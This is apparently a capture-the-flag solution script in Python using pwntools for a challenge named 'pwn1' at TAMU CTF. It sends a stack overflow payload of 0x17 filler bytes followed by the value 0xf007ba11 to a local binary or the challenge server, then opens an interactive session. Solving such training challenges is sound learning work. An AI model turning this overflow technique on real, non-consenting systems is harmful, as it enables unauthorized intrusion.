from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    buf = 'A' * 0x17 + p32(0xf007ba11)
    proc.sendline(buf)


if __name__ == '__main__':
    context.arch = 'i386'
    connect = 'nc pwn.ctf.tamu.edu 4321'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./pwn1'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
